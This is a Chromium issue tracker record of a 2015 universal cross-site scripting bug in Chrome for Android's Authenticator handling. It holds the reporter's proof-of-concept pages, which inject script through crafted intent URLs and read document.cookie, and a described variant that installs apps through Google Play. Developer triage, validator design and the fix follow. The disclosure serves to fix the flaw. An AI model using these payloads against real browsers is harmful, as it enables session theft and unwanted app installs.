# Security: UXSS in AuthenticatorHelper

| Field | Value |
|-------|-------|
| **Issue ID** | [40081517](https://issues.chromium.org/issues/40081517) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Platforms** | Android |
| **Reporter** | wi...@gmail.com |
| **Assignee** | pa...@chromium.org |
| **Created** | 2015-02-28 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

sendMessageToPage in com.google.android.apps.chrome.tab.AuthenticatorHelper  

can execute user controlled javascript in the current tab from java world, which may bypass SOP check in the c++ world.

**VERSION**  

Chrome Version: Chrome for Android 40.0.2214.109  

Operating System: Android 4.4.2

**REPRODUCTION CASE**

sendMessageToPage in com.google.android.apps.chrome.tab.AuthenticatorHelper will call evaluateJavaScript to execute javascript in the current tab. User controlled data is used to build the js statement. single quote can be used to inject arbitrary js statement.

From first look, this is not vulnerable. but combined with several tricks, it may leads to UXSS.

POC1 : SOP bypass with frame confusion

Suppose parent.html in the victim domain iframed a html page child.html from evil domain.

parent.html

<body>
<iframe src="http://evil.com/child.html"><iframe>
</body>

child.html

<body>
<script>
parent.location = "intent://10010#Intent;scheme=tel;action=com.google.android.apps.authenticator.AUTHENTICATE;end','\\*');alert(document.cookie);//";
</script>
</body>

when user visit the parent.html in chrome for android, child.html can execute javascript in the parent domain by frame confusion, thus bypass the SOP.

POC2 : UXSS with boomerang javascript

open the following uxss.html in chrome for android, then press home button to return to the desktop. Wait for 10 seconds, the chrome may popup automatically (if not, just open it) and get UXSSed. (if don't press home button, it also works, but with a chance of failure)

uxss.html

<body>
<link rel="prerender" href="http://www.google.com"/>
<script>
setTimeout(function(){
location = "googlechrome://navigate?url=intent://10010#Intent;scheme=tel;action=com.google.android.apps.authenticator.AUTHENTICATE;end','\\*');alert(document.cookie);//";
setTimeout(function(){location="http://www.google.com"},0);
},10000);
</script>
</body>

## Attachments

- [uxss.html](attachments/uxss.html) (text/html, 356 B)
- [parent.html](attachments/parent.html) (text/html, 67 B)
- [child.html](attachments/child.html) (text/html, 189 B)
- [uxss3.html](attachments/uxss3.html) (text/html, 981 B)

## Timeline

### wi...@gmail.com (2015-02-28)

[Comment Deleted]

### wi...@gmail.com (2015-02-28)

p.s. more explanation about "not press home button" & "chance of failure":

Visit the above uxss.html page in the chrome for android. The page is initially blank, and will fire UXSS payload after 10 seconds. 
If user don't press home button, user need to touch the blank page at any place during this 10 seconds, after that, the UXSS will also fire successfully. 


### in...@chromium.org (2015-03-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-03-02)

[Empty comment from Monorail migration]

### wi...@gmail.com (2015-03-12)

BTW, You can credit me as "WangTao(neobyte) of Baidu X-Team"


### cl...@chromium.org (2015-03-14)

feng@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-03-28)

feng@: Uh oh! This issue is still open and hasn't been updated in the last 28 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-04-03)

[Empty comment from Monorail migration]

### wi...@gmail.com (2015-04-03)

Hi, this vulnerability can be used in the googleplay to install any app on the phone.

The following is the updated exploit, it will install "com.paloaltonetworks.ctd.ihscanner" on your phone.

just browse the html in the chrome for android, then tap once at any place in the screen, and wait for a few seconds...

Tested on the latest chrome for android
version: 41.0.2272.96
Os: Android 4.4.4 Nexus 4

### wi...@gmail.com (2015-04-04)

The user should have logined into the googleplay account

P.S. the encoded javascript is 
setTimeout(function(){document.querySelector('button.play-button.apps.loonie-ok-button').click();},3000)

I have posted a video for this:
https://youtu.be/z2BKjJMF6JA

### cl...@chromium.org (2015-04-12)

feng@: Uh oh! This issue is still open and hasn't been updated in the last 43 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### fe...@chromium.org (2015-04-21)

I believe feng@ recently left the project. navabi@, might you be a good alternate owner? if not, do you have suggestions for anyone else who could pick up this bug?

### [Deleted User] (2015-04-23)

No I am not a good alternate owner for this as this does not have to do with infrastructure.  

I'm not sure who is a good owner, because I can't find the AuthenticatorHelper file to do a git log on. Adding some clank folks that may know.

### yf...@chromium.org (2015-04-23)

Looks like Jaekyun made some sanitization checks in there previously

### yf...@chromium.org (2015-04-23)

+palmer as well as he's probably interested. Looks like this has been the source of other exploits (https://crbug.com/chromium/421817) so beyond the specific issue we should look to harden this piece of code

### yf...@chromium.org (2015-04-23)

I have been able to reproduce this locally on 4.4.4 but not on 5.1

### yf...@chromium.org (2015-04-23)

On trunk, the navigation is actually getting blocked. Possibly related to https://codereview.chromium.org/1039013002 ?

### yf...@chromium.org (2015-04-23)

[Empty comment from Monorail migration]

### yf...@chromium.org (2015-04-23)

I can confirm that reverting that patch re-introduced the bug on head. Not sure about immediate next steps. Changwan/Jaekyun can you investigate further to better understand the difference? It seems unintended based on your change description.

### pa...@chromium.org (2015-04-23)

Nice work, wintao. Thank you. :)

It's good (I think?) to block the navigation — at least it appears blocks the attack. But, is it also blocking legitimate functionality? The underlying problem is that we accepted an unacceptable URL. We still need to fix that.

We have a pretty bad language-theoretic security problem here. URLs come from a surprisingly complex grammar, and now we are nesting them:

"googlechrome://navigate?url=intent://10010#Intent;scheme=tel;action=com.google.android.apps.authenticator.AUTHENTICATE;end','*');alert(document.cookie);//"

A googlechrome URL that contains an intent URL that contains a serialized Intent plus some other stuff that somehow gets called as JavaScript...

There should be a validateIntentURL function that would accept "intent://10010#Intent;scheme=tel;action=com.google.android.apps.authenticator.AUTHENTICATE;end" and other strings described by the grammar in https://developer.chrome.com/multidevice/android/intents#syntax, but reject everything else. The fact that there is stuff after the ";end" should have caused us to reject wintao's attack URL. We should also then validate that each component of the intent URL is valid for its meaning — package names are valid package name strings, schemes are valid schemes, and so on.

Does such a function already exist? If not, we'll need to write one. And then we need to call it somewhere.

One place to validate or sanitize URLs is in the ExternalNavigationParams constructor, which currently does no validation. ChromeTab calls into it, e.g.:

1158             ExternalNavigationParams params = new ExternalNavigationParams.Builder(url, incognito)
1159                     .setTab(ChromeTab.this)
1160                     .setOpenInNewTab(true)
1161                     .build();
1162             return mExternalNavHandler.shouldOverrideUrlLoading(params)
1163                     != ExternalNavigationHandler.OverrideUrlLoadingResult.NO_OVERRIDE;

Perhaps the validation could go in mExternalNavHandler.shouldOverrideUrlLoading, but I think it's safest and most universal to put it in ExternalNavigationParams — either the params are valid for external navigation, or they are not, and that is determined upon construction, and no further check should be necessary.

Alternately, the check could go in mAuthenticatorHelper.handleAuthenticatorUrl(url), if we are sure that call will always be called before initiating navigation.

Additionally, we should not be concatenating untrustworthy strings (such as from web content), unescaped, into JavaScript that we execute. That is never a good idea (especially since unescaping them correctly is not always obvious).

--> The first thing we need to do is to determine if there already exists an intent URL validator in our codebase. If not, we need to write one. Does anyone know?

### ja...@chromium.org (2015-04-23)

This isn't related to a normal Intent handling, but related to GoogleAuthenticatorNavigationInterceptor; https://cs.corp.google.com/#clankium/src/clank/java/apps/chrome_internal/src/com/google/android/apps/chrome/tab/GoogleAuthenticatorNavigationInterceptor.java&sq=package:%5Eclankium$&l=160 seems problematic.

So I don't believe that https://codereview.chromium.org/1039013002 is related to this issue.

I'm struggling to set up Google Authenticator to re-produce this anyway.



### pa...@chromium.org (2015-04-23)

I'm on it.

### ja...@chromium.org (2015-04-23)

FYI, I confirmed that https://cs.corp.google.com/#clankium/src/clank/java/apps/chrome_internal/src/com/google/android/apps/chrome/tab/GoogleAuthenticatorNavigationInterceptor.java&sq=package:%5Eclankium$&l=184 executed the appended script without any validation.

### yf...@chromium.org (2015-04-24)

I also agree with palmer on #20 that we should check whether this is breaking some legitimate functionality. Changwan did you verify whether the authenticator integration is still working when making the patch?

For existing/similar code, it's worth looking at IntentHandler/IntentHandlerTest. I don't think we have strict validation like you're adding but there is logic there about rejecting some intents.

### fe...@chromium.org (2015-04-24)

[Empty comment from Monorail migration]

### ch...@chromium.org (2015-04-27)

Re #20 and #24, the fallback CL only affects cases where fallback URL exists, and assuming google authentication will never use fallback, that CL should not affect google authentication.

### pa...@chromium.org (2015-04-28)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-04-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e8b8c72eb8eb462c52a707c556d53d350bbd408d

commit e8b8c72eb8eb462c52a707c556d53d350bbd408d
Author: palmer <palmer@google.com>
Date: Wed Apr 29 23:28:13 2015

Add a validator for intent:// URLs.

BUG=462843,482113

Review URL: https://codereview.chromium.org/1059413004

Cr-Commit-Position: refs/heads/master@{#327613}

[modify] http://crrev.com/e8b8c72eb8eb462c52a707c556d53d350bbd408d/chrome/android/java/src/org/chromium/chrome/browser/UrlUtilities.java
[modify] http://crrev.com/e8b8c72eb8eb462c52a707c556d53d350bbd408d/chrome/android/javatests/src/org/chromium/chrome/browser/UrlUtilitiesTest.java


### bu...@chromium.org (2015-04-29)

The following change refers to this bug:
https://chrome-internal-review.googlesource.com/214797

### pa...@google.com (2015-04-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-04-30)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### pa...@chromium.org (2015-05-05)

Not fixed yet; the patch keeps getting reverted because tests in place seem to ensure that JavaScript be sent in intent: URLs. jcivelli, can you pick this bug up or advise me on how to fix it without breaking functionality?

### pa...@chromium.org (2015-05-05)

[Empty comment from Monorail migration]

### yf...@chromium.org (2015-05-05)

Jay's not on clank-team anymore so I don't think you'll get response here.

### pa...@chromium.org (2015-05-05)

Ah, I didn't realize. Anyone else? It seems that script injection is part of the design, which is not great.

### kl...@chromium.org (2015-05-05)

Here is the old design doc, https://docs.google.com/document/d/1-0K6cGgnd0MgoqhMg82D22AJ9_T5XTeFCpXbKxsmbdw/edit#heading=h.5nal20kyxk22 and launch bug https://code.google.com/p/chromium/issues/detail?id=309058

Jay is still around, I am sure he can answer the questions.



### ja...@chromium.org (2015-05-05)

I got the following logs while running GoogleAuthenticatorNavigationInterceptorTest.

W/Chrome  (22673): Bad URI 'intent:#Intent;action=com.google.android.apps.chrome.TEST_AUTHENTICATOR;category=android.intent.category.BROWSABLE;S.inputData=%7B%20name%3A%20%22tommy%20wiseau%22%2C%20age%3A%20%22undefined%22%7D;end'

...

W/Chrome  (22859): Bad URI 'intent:#Intent;action=com.google.android.apps.chrome.TEST_AUTHENTICATOR_NOT_INSTALLED;category=android.intent.category.BROWSABLE;end'

...

W/Chrome  (23060): Bad URI 'intent:#Intent;action=com.google.android.apps.chrome.TEST_AUTHENTICATOR;category=android.intent.category.BROWSABLE;S.inputData=cancelled;end'

The test URIs don't have any path; intent:any_path#Intent vs. intent:#Intent. But I confirmed that a similar URI was passed from the production site as well; you can see how to test Authenticator in https://crbug.com/chromium/434906. So we need to contact the Authenticator team not to break the functionality. Or we should accept such URIs as valid ones.


### pa...@chromium.org (2015-05-05)

#37: Yes, I wrote a tweak to validateIntentUrl to handle that: https://codereview.chromium.org/1124983002/

But, yes, Authenticator team is sending URIs that look different from what Intent.toUri creates. Sigh.

### cl...@chromium.org (2015-05-06)

You have far exceeded the 60-day deadline for fixing this high severity security vulnerability.

We commit ourselves to this deadline and appreciate your utmost priority on this issue.

If you are unable to look into this soon, please find someone else to own this.

- Your friendly ClusterFuzz

### ti...@google.com (2015-05-08)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-05-08)

The following change refers to this bug:
https://chrome-internal-review.googlesource.com/215451

### pa...@chromium.org (2015-05-08)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-16)

Moving to M44 - not going to make the M43 Android train.

### pa...@chromium.org (2015-06-08)

[Empty comment from Monorail migration]

### mb...@chromium.org (2015-07-16)

[Empty comment from Monorail migration]

### mb...@chromium.org (2015-07-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-08-14)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-08-17)

Thanks again for the report WangTao! :)

We'll be in contact to collect payment details this week. If you don't hear from someone, please contact me directly at timwillis@.

### wi...@gmail.com (2015-08-18)

thank you!

### ti...@google.com (2015-08-28)

[Empty comment from Monorail migration]

### ti...@google.com (2015-09-10)

Processing via our e-payment system takes ~7 days, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/462843?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081517)*
